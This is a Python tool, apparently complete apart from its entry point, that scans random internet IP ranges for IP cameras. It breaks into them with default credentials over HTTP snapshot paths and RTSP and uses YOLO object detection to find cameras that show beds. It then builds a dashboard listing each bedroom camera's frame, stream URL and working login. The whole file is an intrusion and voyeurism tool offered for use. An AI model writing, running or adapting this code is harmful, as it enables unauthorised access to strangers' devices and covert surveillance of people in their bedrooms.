#!/usr/bin/env python3
"""
TITAN BED HUNTER — Ultra-Fast Worldwide Live Camera Scanner
Strategy:
  1. Port-scan thousands of IPs per second using async sockets
  2. For each live host: probe HTTP snapshot URLs + RTSP in parallel
  3. Run YOLO on captured frames to detect beds
  4. Build live streaming HTML dashboard that auto-refreshes frames
"""

import asyncio
import base64
import ipaddress
import json
import os
import random
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import URLError
import urllib.parse

# ── paths ─────────────────────────────────────────────────
BASE = Path(__file__).resolve().parent
FRAMES = BASE / "hunt_frames"
RESULTS = BASE / "results"
YOLO_MODEL = BASE.parent / "yolov8n.pt"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

sys.path.insert(0, str(BASE))
from cctv_config import GLOBAL_CIDRS, RTSP_PATHS, CREDENTIALS, YOLO_CLASSES

# ══════════════════════════════════════════════════════════
# GLOBALS
# ══════════════════════════════════════════════════════════
FOUND_CAMS = []          # all live cams (any room)
BED_CAMS   = []          # cams where YOLO detected a bed
LOCK       = threading.Lock()
TARGET     = 100
STATS = {
    "ips_tried": 0, "ports_open": 0, "http_hit": 0,
    "rtsp_hit": 0, "frames_ok": 0, "yolo_ok": 0, "beds": 0,
    "status": "idle"
}

# ══════════════════════════════════════════════════════════
# CIDR → IP GENERATOR  (wide, random)
# ══════════════════════════════════════════════════════════

def ip_stream(cidrs: list, batch: int = 20000):
    """Yield random IPs from CIDRs indefinitely in shuffled batches."""
    nets = []
    for c in cidrs:
        try:
            nets.append(ipaddress.ip_network(c, strict=False))
        except ValueError:
            pass
    weights = [n.num_addresses for n in nets]
    while True:
        ips = set()
        while len(ips) < batch:
            net = random.choices(nets, weights=weights, k=1)[0]
            off = random.randint(1, max(1, net.num_addresses - 2))
            ip  = str(net.network_address + off)
            if not (ip.endswith(".0") or ip.endswith(".255")):
                ips.add(ip)
        lst = list(ips)
        random.shuffle(lst)
        yield from lst


# ══════════════════════════════════════════════════════════
# ASYNC PORT SCANNER — scan 10k IPs/s on single machine
# ══════════════════════════════════════════════════════════

async def _check_port_async(ip: str, port: int, sem: asyncio.Semaphore, timeout: float = 1.0):
    async with sem:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return (ip, port, True)
        except Exception:
            return (ip, port, False)


async def scan_ips_async(ips: list, ports: list = None, concurrency: int = 2000, timeout: float = 0.8):
    """Async port scan — returns list of (ip, port) tuples that responded."""
    ports = ports or [554, 80, 8080, 8554, 8081, 8888, 37777, 34567, 81]
    sem   = asyncio.Semaphore(concurrency)
    tasks = [_check_port_async(ip, p, sem, timeout) for ip in ips for p in ports]
    hits  = []
    for coro in asyncio.as_completed(tasks):
        ip, port, ok = await coro
        if ok:
            hits.append((ip, port))
    return hits


def port_scan(ips: list, ports: list = None, concurrency: int = 1500) -> list:
    """Synchronous wrapper around async port scan."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(scan_ips_async(ips, ports, concurrency))
    finally:
        loop.close()


# ══════════════════════════════════════════════════════════
# BANNER CHECK — filter cameras from random web servers
# ══════════════════════════════════════════════════════════

CAMERA_SIGNATURES = [
    b"hikvision", b"dahua", b"dvrdvs", b"ipcam", b"netcam", b"webcam",
    b"network camera", b"ip camera", b"nvr", b"dvr", b"cam", b"axis",
    b"vivotek", b"foscam", b"amcrest", b"reolink", b"tplink", b"tapo",
    b"onvif", b"rtsp", b"streaming", b"video", b"mjpeg", b"snapshot",
    b"realmonitor", b"live view", b"login", b"mini_httpd", b"boa/",
    b"thttpd", b"cross web server", b"web viewer", b"goahead",
    b"channel", b"surveillance", b"cctv", b"security",
    b"digest realm", b"basic realm", b"www-authenticate",
    b"401 unauthorized",  # cameras often return 401 = auth required
]

def is_camera_http(ip: str, port: int, timeout: float = 3.0) -> bool:
    """Quick HTTP check: does the server look like a camera?"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(f"GET / HTTP/1.0\r\nHost: {ip}\r\n\r\n".encode())
        data = s.recv(2048).lower()
        s.close()
        # 401 Unauthorized = camera with auth (very common for cameras)
        if b"401" in data[:30]:
            return True
        for sig in CAMERA_SIGNATURES:
            if sig in data:
                return True
    except Exception:
        pass
    return False

# (path, timeout_s, method)
HTTP_SNAPSHOT_PATHS = [
    # Hikvision
    "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/1/picture",
    "/onvif-http/snapshot?auth=YWRtaW46MTIZNDU=",
    # Dahua
    "/cgi-bin/snapshot.cgi",
    "/cgi-bin/snapshot.cgi?channel=1",
    # Generic
    "/snapshot.jpg",
    "/snapshot.cgi",
    "/image.jpg",
    "/image",
    "/cgi-bin/image.jpg",
    "/cgi-bin/viewer/video.jpg",
    "/video.jpg",
    "/capture",
    "/jpg/image.jpg",
    "/axis-cgi/jpg/image.cgi",
    "/axis-cgi/jpg/image.cgi?resolution=640x480",
    # Foscam
    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=",
    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr=admin&pwd=admin",
    # Amcrest / Dahua sub
    "/cgi-bin/snapshot.cgi?1",
    # TP-Link Tapo / MJPEG
    "/stream/video.mjpg",
    "/video.mjpg",
    "/video1.mjpg",
    "/live/1/mjpeg.jpg",
    # Chinese generic NVR/DVR
    "/web/auto2012.htm",
    "/doc/page/login.asp",
    # Reolink
    "/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=abcdefgh&user=admin&password=",
    # D-Link
    "/video.cgi",
    "/video1.cgi",
    # TVT / Tyco / generic
    "/PSIA/Streaming/channels/1/picture",
    "/Streaming/Channels/1/picture",
]

HTTP_CREDS = [
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "1234"),
    ("admin", "888888"),
    ("root",  ""),
    ("root",  "root"),
    ("admin", "password"),
]


def _fetch_image(url: str, user: str = "", pwd: str = "", timeout: float = 4.0) -> bytes | None:
    """Fetch URL with basic auth. Returns raw bytes ONLY if valid JPEG/PNG."""
    try:
        req = Request(url)
        req.add_header("User-Agent", "Mozilla/5.0")
        if user:
            import base64 as b64
            cred = b64.b64encode(f"{user}:{pwd}".encode()).decode()
            req.add_header("Authorization", f"Basic {cred}")
        with urlopen(req, timeout=timeout) as r:
            ct = r.headers.get("Content-Type", "")
            # Quick reject: skip obvious HTML/text responses
            if ct and ("text/html" in ct or "text/plain" in ct or "application/json" in ct):
                return None
            data = r.read(500 * 1024)  # max 500 KB
            # STRICT: must start with JPEG or PNG magic bytes
            if len(data) > 3000 and (data[:3] == b"\xff\xd8\xff" or data[:4] == b"\x89PNG"):
                return data
            # Also accept if Content-Type says image and data is big enough
            if ct and "image/" in ct and len(data) > 3000 and data[:4] != b"<!do" and data[:1] != b"<":
                return data
    except Exception:
        pass
    return None


def probe_http_camera(ip: str, port: int, workers: int = 6) -> dict | None:
    """Try HTTP snapshot paths with multiple creds. Return hit or None."""
    # Build all (url, user, pwd) combos, shuffle for variety
    combos = []
    for path in HTTP_SNAPSHOT_PATHS:
        for user, pwd in HTTP_CREDS[:5]:  # top 5 creds per path
            scheme = "https" if port == 443 else "http"
            combos.append((f"{scheme}://{ip}:{port}{path}", user, pwd))
    random.shuffle(combos)

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futs = {
            pool.submit(_fetch_image, url, user, pwd): (url, user, pwd)
            for url, user, pwd in combos[:80]  # try up to 80 combinations
        }
        for fut in as_completed(futs):
            url, user, pwd = futs[fut]
            try:
                data = fut.result()
                if data:
                    # Save frame
                    safe_ip = ip.replace(".", "_")
                    frame_path = str(FRAMES / f"bed_{safe_ip}_{port}.jpg")
                    with open(frame_path, "wb") as f:
                        f.write(data)
                    # Cancel remaining
                    for f in futs:
                        f.cancel()
                    return {
                        "ip": ip, "port": port,
                        "url": url, "user": user, "password": pwd,
                        "frame_file": frame_path,
                        "frame_size": len(data),
                        "type": "http",
                        "timestamp": datetime.now().isoformat(),
                    }
            except Exception:
                pass
    return None


# ══════════════════════════════════════════════════════════
# RTSP PROBE — fast ffmpeg grab (short timeout)
# ══════════════════════════════════════════════════════════

RTSP_FAST_PATHS = [
    "/Streaming/Channels/101",
    "/h264/ch1/main/av_stream",
    "/cam/realmonitor?channel=1&subtype=0",
    "/stream1",
    "/live",
    "/live/ch00_0",
    "/videoMain",
    "/0",
    "/1",
    "/",
    "/live.sdp",
    "/onvif1",
    "/Streaming/Channels/1",
    "/h264Preview_01_main",
    "/MediaInput/h264",
]


def probe_rtsp_fast(ip: str, port: int = 554, timeout: int = 4) -> dict | None:
    """Single-shot RTSP probe with parallel cred/path combos. Fast version."""
    combos = []
    for user, pwd in CREDENTIALS[:8]:
        for path in RTSP_FAST_PATHS[:8]:
            auth = f"{user}:{pwd}@" if pwd else f"{user}:@"
            combos.append((f"rtsp://{auth}{ip}:{port}{path}", user, pwd, path))
    random.shuffle(combos)

    safe_ip = ip.replace(".", "_")
    frame_path = str(FRAMES / f"bed_{safe_ip}_{port}.jpg")

    def _try_rtsp(rtsp_url, user, pwd, path):
        try:
            r = subprocess.run(
                ["ffmpeg", "-y", "-rtsp_transport", "tcp",
                 "-stimeout", "2000000",
                 "-i", rtsp_url,
                 "-vframes", "1", "-vf", "scale=640:-1",
                 "-f", "image2", frame_path],
                capture_output=True, timeout=timeout, text=True,
            )
            if r.returncode == 0 and os.path.isfile(frame_path) and os.path.getsize(frame_path) > 3000:
                # Verify it's a real image (JPEG magic)
                with open(frame_path, "rb") as fh:
                    hdr = fh.read(4)
                if hdr[:3] != b"\xff\xd8\xff" and hdr[:4] != b"\x89PNG":
                    os.remove(frame_path)
                    return None
                res = re.search(r"(\d{2,5})x(\d{2,5})", r.stderr)
                reso = f"{res.group(1)}x{res.group(2)}" if res else "?"
                return {
                    "ip": ip, "port": port,
                    "rtsp_url": rtsp_url,
                    "user": user, "password": pwd,
                    "rtsp_path": path,
                    "frame_file": frame_path,
                    "frame_size": os.path.getsize(frame_path),
                    "resolution": reso,
                    "type": "rtsp",
                    "timestamp": datetime.now().isoformat(),
                }
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
        return None

    # Try first 16 combos in parallel (4 at a time to avoid fork explosion)
    with ThreadPoolExecutor(max_workers=4) as pool:
        futs = {pool.submit(_try_rtsp, *c): c for c in combos[:16]}
        for fut in as_completed(futs):
            res = fut.result()
            if res:
                for f in futs:
                    f.cancel()
                return res
    return None


# ══════════════════════════════════════════════════════════
# YOLO — detect bed (class 59)
# ══════════════════════════════════════════════════════════

_yolo_model = None
_yolo_lock  = threading.Lock()

def get_yolo():
    global _yolo_model
    if _yolo_model is None:
        with _yolo_lock:
            if _yolo_model is None:
                from ultralytics import YOLO
                mp = str(YOLO_MODEL) if YOLO_MODEL.exists() else "yolov8n.pt"
                _yolo_model = YOLO(mp)
    return _yolo_model


def yolo_has_bed(frame_path: str, conf: float = 0.25) -> dict:
    """Return dict: has_bed, bed_conf, all_objects."""
    if not os.path.isfile(frame_path):
        return {"has_bed": False, "bed_conf": 0, "objects": []}
    try:
        m = get_yolo()
        results = m(frame_path, conf=conf, verbose=False)
        labels = []
        bed_conf = 0.0
        for r in results:
            for box in r.boxes:
                cls = int(box.cls[0])
                label = YOLO_CLASSES.get(cls, f"cls{cls}")
                c     = float(box.conf[0])
                labels.append(label)
                if cls == 59:
                    bed_conf = max(bed_conf, c)
        return {
            "has_bed": bed_conf > 0,
            "bed_conf": round(bed_conf, 3),
            "objects": list(set(labels)),
        }
    except Exception as e:
        return {"has_bed": False, "bed_conf": 0, "objects": [], "err": str(e)}


def frame_to_b64(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception:
        return ""


# ══════════════════════════════════════════════════════════
# MAIN HUNTING LOOP
# ══════════════════════════════════════════════════════════

def probe_host(ip: str, open_ports: list) -> dict | None:
    """Try HTTP then RTSP on an IP with known open ports. Return cam dict or None."""
    cam = None

    # ── RTSP first (most reliable for actual cameras) ───
    for port in open_ports:
        if port in (554, 8554, 37777, 34567):
            cam = probe_rtsp_fast(ip, port)
            if cam:
                return cam

    # ── HTTP — only try if banner looks like a camera ───
    for port in open_ports:
        if port in (80, 8080, 8081, 8888, 81, 443):
            if is_camera_http(ip, port):
                cam = probe_http_camera(ip, port)
                if cam:
                    return cam

    # ── Last resort: RTSP on unusual ports ──────────────
    for port in open_ports:
        if port not in (554, 8554, 37777, 34567, 80, 8080, 8081, 8888, 81, 443):
            cam = probe_rtsp_fast(ip, port)
            if cam:
                return cam

    return None


def hunt_loop(all_cidrs: list, http_workers: int = 60, batch_size: int = 8000):
    """Main scan loop — keeps scanning until TARGET beds found."""
    STATS["status"] = "scanning"
    gen = ip_stream(all_cidrs, batch=batch_size)
    round_num = 0

    while len(BED_CAMS) < TARGET:
        round_num += 1
        # Pull next batch of IPs
        ips = [next(gen) for _ in range(batch_size)]
        STATS["ips_tried"] += len(ips)

        print(f"\n[ROUND {round_num}] Port scanning {len(ips):,} IPs | beds={len(BED_CAMS)}/{TARGET}")

        # ── Async port scan ─────────────────────────────
        hits = port_scan(ips, ports=[554, 80, 8080, 8081, 8554, 8888, 81, 37777, 34567], concurrency=2000)
        if not hits:
            print(f"  → 0 open ports, next batch")
            continue

        # Group by IP
        from collections import defaultdict
        by_ip = defaultdict(list)
        for ip, port in hits:
            by_ip[ip].append(port)

        print(f"  → {len(hits)} open ports on {len(by_ip)} IPs")
        STATS["ports_open"] += len(hits)

        # ── Probe each reachable host ────────────────────
        with ThreadPoolExecutor(max_workers=http_workers) as pool:
            futs = {pool.submit(probe_host, ip, ports): ip
                    for ip, ports in by_ip.items()}

            for fut in as_completed(futs):
                if len(BED_CAMS) >= TARGET:
                    for f in futs:
                        f.cancel()
                    break
                ip = futs[fut]
                try:
                    cam = fut.result()
                    if cam is None:
                        continue

                    cam_type = cam.get("type", "?")
                    if cam_type == "http":
                        STATS["http_hit"] += 1
                    else:
                        STATS["rtsp_hit"] += 1
                    STATS["frames_ok"] += 1

                    # Run YOLO
                    yolo = yolo_has_bed(cam["frame_file"])
                    cam["yolo"] = yolo
                    STATS["yolo_ok"] += 1

                    # Add frame b64
                    cam["frame_b64"] = frame_to_b64(cam["frame_file"])

                    with LOCK:
                        FOUND_CAMS.append(cam)

                    if yolo["has_bed"]:
                        STATS["beds"] += 1
                        with LOCK:
                            BED_CAMS.append(cam)
                        print(f"  🛏  BED #{len(BED_CAMS):>3}  {ip:>15}  "
                              f"conf={yolo['bed_conf']:.2f}  "
                              f"objects={yolo['objects']}  type={cam_type}")
                    else:
                        room_objs = yolo["objects"]
                        print(f"  📷  CAM      {ip:>15}  objects={room_objs}  type={cam_type}")

                    # Save results every 5 beds
                    if len(BED_CAMS) % 5 == 0 and len(BED_CAMS) > 0:
                        save_results()
                        regen_dashboard()

                except Exception as e:
                    pass

        if len(BED_CAMS) >= TARGET:
            break

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    print(f"\n{'='*60}")
    print(f"  COMPLETE — {len(BED_CAMS)} bed cameras found")
    print(f"  Total cams captured: {len(FOUND_CAMS)}")
    print(f"  IPs tried: {STATS['ips_tried']:,}")
    print(f"  Open ports: {STATS['ports_open']:,}")
    print(f"{'='*60}")


# ══════════════════════════════════════════════════════════
# DASHBOARD — live HTML page
# ══════════════════════════════════════════════════════════

DASHBOARD_PATH = BASE / "bed_stream.html"


def regen_dashboard():
    """Regenerate the HTML streaming page."""
    all_cams_json = json.dumps([{
        "ip":       c.get("ip"),
        "url":      c.get("url") or c.get("rtsp_url", ""),
        "type":     c.get("type", ""),
        "user":     c.get("user", ""),
        "password": c.get("password", ""),
        "resolution": c.get("resolution", "?"),
        "bed_conf": c.get("yolo", {}).get("bed_conf", 0),
        "has_bed":  c.get("yolo", {}).get("has_bed", False),
        "objects":  c.get("yolo", {}).get("objects", []),
        "frame_b64": c.get("frame_b64", ""),
        "timestamp": c.get("timestamp", ""),
    } for c in FOUND_CAMS], default=str)

    bed_cams_json = json.dumps([{
        "ip":       c.get("ip"),
        "url":      c.get("url") or c.get("rtsp_url", ""),
        "type":     c.get("type", ""),
        "user":     c.get("user", ""),
        "password": c.get("password", ""),
        "resolution": c.get("resolution", "?"),
        "bed_conf": c.get("yolo", {}).get("bed_conf", 0),
        "objects":  c.get("yolo", {}).get("objects", []),
        "frame_b64": c.get("frame_b64", ""),
        "timestamp": c.get("timestamp", ""),
    } for c in BED_CAMS], default=str)

    stats_json = json.dumps({
        "ips_tried": STATS["ips_tried"],
        "ports_open": STATS["ports_open"],
        "frames_ok": STATS["frames_ok"],
        "beds": STATS["beds"],
        "status": STATS["status"],
    })

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="15">
<title>TITAN CCTV — {len(BED_CAMS)} Bed Cams | {len(FOUND_CAMS)} Total Live</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#08080f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif}}
.hdr{{background:linear-gradient(135deg,#1a0035,#0d0018);border-bottom:2px solid #7c3aed;
      padding:18px 28px;display:flex;justify-content:space-between;align-items:center;
      position:sticky;top:0;z-index:100}}
.hdr h1{{font-size:1.5em;background:linear-gradient(90deg,#a855f7,#ec4899);
         -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.stats{{display:flex;gap:20px}}
.stat{{text-align:center}}
.sv{{font-size:1.8em;font-weight:800;color:#a855f7}}
.sl{{font-size:.72em;color:#888;text-transform:uppercase}}
.tabs{{display:flex;background:#0f0f1a;padding:0 28px;border-bottom:1px solid #222;gap:4px}}
.tab{{padding:10px 22px;cursor:pointer;border-bottom:2px solid transparent;
      font-size:.88em;font-weight:600;color:#888;transition:all .2s}}
.tab.active{{color:#a855f7;border-bottom-color:#a855f7}}
.search{{background:#111118;padding:10px 28px;display:flex;gap:10px}}
.search input{{background:#1a1a28;border:1px solid #333;color:#e0e0e0;
               padding:7px 14px;border-radius:6px;width:260px;font-size:.85em}}
.grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));
       gap:14px;padding:18px 28px}}
.card{{background:#111118;border:1px solid #222;border-radius:10px;overflow:hidden;
       transition:all .3s;position:relative}}
.card:hover{{border-color:#7c3aed;box-shadow:0 4px 18px rgba(124,58,237,.3);transform:translateY(-2px)}}
.frame{{position:relative;background:#000;aspect-ratio:16/9;display:flex;
        align-items:center;justify-content:center;overflow:hidden;cursor:zoom-in}}
.frame img{{width:100%;height:100%;object-fit:cover}}
.frame .no-img{{color:#333;font-size:.8em}}
.badge{{position:absolute;top:7px;right:7px;padding:2px 9px;border-radius:10px;
        font-size:.68em;font-weight:700;text-transform:uppercase}}
.badge.bed{{background:rgba(16,185,129,.9);color:#fff}}
.badge.live{{background:rgba(59,130,246,.9);color:#fff}}
.num{{position:absolute;top:7px;left:7px;background:rgba(124,58,237,.9);
      color:#fff;padding:2px 9px;border-radius:10px;font-size:.72em;font-weight:700}}
.info{{padding:11px 14px}}
.ip{{font-family:monospace;font-size:.92em;color:#a855f7;margin-bottom:3px}}
.meta{{display:flex;gap:10px;font-size:.75em;color:#888;margin-top:5px;flex-wrap:wrap}}
.bar{{height:3px;background:#222;border-radius:2px;margin-top:7px;overflow:hidden}}
.fill{{height:100%;border-radius:2px;transition:width .5s}}
.tags{{margin-top:6px;display:flex;gap:3px;flex-wrap:wrap}}
.tag{{background:#1e1e30;border:1px solid #333;padding:1px 7px;border-radius:9px;
      font-size:.68em;color:#ccc}}
.tag.bed-tag{{background:#3b0764;border-color:#7c3aed;color:#d8b4fe}}
.btns{{display:flex;gap:6px;margin-top:8px}}
.btn{{padding:4px 12px;border-radius:6px;font-size:.73em;cursor:pointer;
      border:none;font-weight:600;transition:all .2s}}
.btn.copy{{background:#1d4ed8;color:#fff}}
.btn.open{{background:#059669;color:#fff}}
.btn:hover{{filter:brightness(1.2)}}
@keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:.4}}}}
.live-dot{{width:7px;height:7px;background:#22c55e;border-radius:50%;
           display:inline-block;animation:pulse 2s infinite;margin-right:4px}}
.modal{{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
        z-index:999;align-items:center;justify-content:center;flex-direction:column}}
.modal.on{{display:flex}}
.modal img{{max-width:92vw;max-height:82vh;border-radius:8px}}
.modal .md{{margin-top:14px;background:#111;padding:14px 22px;border-radius:8px;
            font-family:monospace;font-size:.82em;max-width:640px;line-height:1.8}}
.modal .cl{{position:absolute;top:18px;right:26px;background:none;border:none;
            color:#fff;font-size:2em;cursor:pointer}}
.empty{{text-align:center;padding:80px 20px;color:#444;font-size:1.1em}}
.section-title{{padding:14px 28px 2px;font-size:.78em;color:#666;text-transform:uppercase;
                letter-spacing:1px;border-top:1px solid #1a1a24;margin-top:6px}}
.footer{{text-align:center;padding:18px;color:#444;font-size:.75em;border-top:1px solid #1a1a24}}
.pbar{{background:#1a1a28;border-radius:6px;height:6px;margin:0 28px 0;overflow:hidden}}
.pbar-fill{{height:100%;background:linear-gradient(90deg,#7c3aed,#ec4899);transition:width 1s;border-radius:6px}}
.progress-text{{padding:6px 28px 14px;font-size:.78em;color:#666}}
</style>
</head>
<body>

<div class="hdr">
  <h1>🌐 TITAN CCTV — Live Worldwide Camera Hunt</h1>
  <div class="stats">
    <div class="stat"><div class="sv" id="s-beds">{len(BED_CAMS)}</div><div class="sl">Bed Cams</div></div>
    <div class="stat"><div class="sv" id="s-total">{len(FOUND_CAMS)}</div><div class="sl">All Live Cams</div></div>
    <div class="stat"><div class="sv" id="s-ips">{STATS["ips_tried"]:,}</div><div class="sl">IPs Scanned</div></div>
    <div class="stat"><div class="sv" id="s-status">{STATS["status"].upper()}</div><div class="sl">Status</div></div>
  </div>
</div>

<div class="pbar"><div class="pbar-fill" style="width:{min(100, len(BED_CAMS))}%"></div></div>
<div class="progress-text">{len(BED_CAMS)}/{TARGET} bed cameras found — {STATS['ips_tried']:,} IPs scanned — {STATS['ports_open']:,} open ports — {STATS['frames_ok']:,} frames captured — page auto-refreshes every 15s</div>

<div class="tabs">
  <div class="tab active" onclick="showTab('beds')">🛏 Bed Cameras ({len(BED_CAMS)})</div>
  <div class="tab" onclick="showTab('all')">📷 All Live Cameras ({len(FOUND_CAMS)})</div>
</div>

<div class="search">
  <input type="text" id="q" placeholder="Filter by IP or object..." oninput="filter()">
</div>

<div id="tab-beds">
  {'<div class="section-title">BEDROOM CAMERAS — YOLO Verified</div>' if BED_CAMS else ''}
  <div class="grid" id="grid-beds"></div>
  {'<div class="empty">🔍 Scanning... bed cameras will appear here as found.<br>Page refreshes every 15 seconds.</div>' if not BED_CAMS else ''}
</div>

<div id="tab-all" style="display:none">
  <div class="section-title">ALL LIVE CAMERAS (any room)</div>
  <div class="grid" id="grid-all"></div>
  {'<div class="empty">🔍 Scanning worldwide...</div>' if not FOUND_CAMS else ''}
</div>

<div class="modal" id="modal">
  <button class="cl" onclick="closeModal()">&#215;</button>
  <img id="m-img" src="">
  <div class="md" id="m-details"></div>
</div>

<div class="footer">
  TITAN CCTV v2 — Worldwide Bed Camera Hunter | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Scanning: {STATS['status'].upper()}
</div>

<script>
const BED_CAMS  = {bed_cams_json};
const ALL_CAMS  = {all_cams_json};
let   activeTab = 'beds';

function camCard(cam, idx) {{
  const pct  = ((cam.bed_conf||0)*100).toFixed(0);
  const fill = cam.bed_conf > .7 ? '#22c55e' : cam.bed_conf > .45 ? '#eab308' : '#6366f1';
  const tags  = (cam.objects||[]).map(o =>
    `<span class="tag${{o==='bed'?' bed-tag':''}}">${{o}}</span>`).join('');
  const imgSrc = cam.frame_b64 ? `data:image/jpeg;base64,${{cam.frame_b64}}` : '';
  const badge  = cam.has_bed
    ? `<div class="badge bed"><span class="live-dot"></span>BED</div>`
    : `<div class="badge live">LIVE</div>`;
  return `
  <div class="card">
    <div class="frame" onclick="openModal(${{idx}},activeTab)">
      ${{imgSrc ? `<img src="${{imgSrc}}" loading="lazy">` : '<div class="no-img">No Frame</div>'}}
      <div class="num">#${{idx+1}}</div>
      ${{badge}}
    </div>
    <div class="info">
      <div class="ip">${{cam.ip}}</div>
      <div class="meta">
        <span>Type: ${{cam.type||'?'}}</span>
        <span>Res: ${{cam.resolution||'?'}}</span>
        <span>Bed: ${{pct}}%</span>
        <span>Objs: ${{(cam.objects||[]).length}}</span>
      </div>
      <div class="bar"><div class="fill" style="width:${{pct}}%;background:${{fill}}"></div></div>
      <div class="tags">${{tags}}</div>
      <div class="btns">
        <button class="btn copy" onclick="copy('${{cam.url}}')">Copy URL</button>
        <button class="btn open" onclick="openModal(${{idx}},activeTab)">Enlarge</button>
      </div>
    </div>
  </div>`;
}}

function renderGrid(cams, gridId) {{
  const el = document.getElementById(gridId);
  if (!el) return;
  const q = (document.getElementById('q')?.value||'').toLowerCase();
  const filtered = q ? cams.filter(c =>
    c.ip.includes(q) || (c.objects||[]).join(' ').includes(q)) : cams;
  el.innerHTML = filtered.map((c,i) => camCard(c,i)).join('');
}}

function showTab(t) {{
  activeTab = t;
  document.getElementById('tab-beds').style.display = t==='beds' ? '' : 'none';
  document.getElementById('tab-all').style.display  = t==='all'  ? '' : 'none';
  document.querySelectorAll('.tab').forEach((el,i) =>
    el.classList.toggle('active', (i===0&&t==='beds')||(i===1&&t==='all')));
}}

function filter() {{
  renderGrid(BED_CAMS, 'grid-beds');
  renderGrid(ALL_CAMS, 'grid-all');
}}

function openModal(idx, tab) {{
  const cams = tab==='beds' ? BED_CAMS : ALL_CAMS;
  const cam  = cams[idx];
  if (!cam) return;
  document.getElementById('m-img').src = cam.frame_b64
    ? `data:image/jpeg;base64,${{cam.frame_b64}}` : '';
  document.getElementById('m-details').innerHTML = `
    <div><b>IP:</b> ${{cam.ip}}</div>
    <div><b>URL:</b> ${{cam.url}}</div>
    <div><b>Type:</b> ${{cam.type}}&nbsp;&nbsp;<b>User:</b> ${{cam.user}} / ${{cam.password}}</div>
    <div><b>Resolution:</b> ${{cam.resolution}}</div>
    <div><b>Bed confidence:</b> ${{((cam.bed_conf||0)*100).toFixed(1)}}%</div>
    <div><b>Objects:</b> ${{(cam.objects||[]).join(', ')||'none'}}</div>
    <div><b>Timestamp:</b> ${{cam.timestamp}}</div>`;
  document.getElementById('modal').classList.add('on');
}}

function closeModal() {{
  document.getElementById('modal').classList.remove('on');
}}

function copy(url) {{
  navigator.clipboard.writeText(url).catch(()=>{{
    const a=document.createElement('textarea');
    a.value=url; document.body.appendChild(a); a.select();
    document.execCommand('copy'); a.remove();
  }});
}}

document.addEventListener('keydown', e => {{ if (e.key==='Escape') closeModal(); }});

// Initial render
renderGrid(BED_CAMS, 'grid-beds');
renderGrid(ALL_CAMS, 'grid-all');
</script>
</body>
</html>"""

    with open(DASHBOARD_PATH, "w") as f:
        f.write(html)


# ══════════════════════════════════════════════════════════
# RESULTS
# ══════════════════════════════════════════════════════════

def save_results():
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": {k: v for k, v in STATS.items()},
        "bed_cams": [{
            "ip": c.get("ip"), "url": c.get("url") or c.get("rtsp_url",""),
            "type": c.get("type",""), "user": c.get("user",""),
            "password": c.get("password",""),
            "resolution": c.get("resolution","?"),
            "bed_conf": c.get("yolo",{}).get("bed_conf",0),
            "objects": c.get("yolo",{}).get("objects",[]),
        } for c in BED_CAMS],
        "all_cams_count": len(FOUND_CAMS),
    }
    with open(RESULTS / "bed_cams_live.json", "w") as f:
        json.dump(out, f, indent=2, default=str)


# ══════════════════════════════════════════════════════════
# HTTP SERVER
# ══════════════════════════════════════════════════════════

def serve(port: int = 7701):
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path in ("/", "/index.html"):
                self.path = "/bed_stream.html"
            if self.path == "/bed_stream.html":
                try:
                    data = DASHBOARD_PATH.read_bytes()
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.end_headers()
                    self.wfile.write(data)
                    return
                except Exception:
                    pass
            elif self.path == "/api/stats":
                d = json.dumps(STATS, default=str).encode()
                self.send_response(200)
                self.send_header("Content-Type","application/json")
                self.send_header("Access-Control-Allow-Origin","*")
                self.end_headers()
                self.wfile.write(d)
                return
            elif self.path == "/api/cameras":
                d = json.dumps([{
                    "ip":      c.get("ip"),
                    "has_bed": c.get("yolo",{}).get("has_bed",False),
                    "bed_conf":c.get("yolo",{}).get("bed_conf",0),
                    "objects": c.get("yolo",{}).get("objects",[]),
                } for c in FOUND_CAMS], default=str).encode()
                self.send_response(200)
                self.send_header("Content-Type","application/json")
                self.send_header("Access-Control-Allow-Origin","*")
                self.end_headers()
                self.wfile.write(d)
                return
            self.send_error(404)
        def log_message(self, *a): pass

    os.chdir(str(BASE))
    s = HTTPServer(("0.0.0.0", port), H)
    print(f"  [SERVER] http://localhost:{port}  — opens bed_stream.html")
    s.serve_forever()


# ══════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target",  type=int, default=100)
    p.add_argument("--port",    type=int, default=7701)
    p.add_argument("--workers", type=int, default=60)
    p.add_argument("--batch",   type=int, default=8000)
    args = p.parse_args()

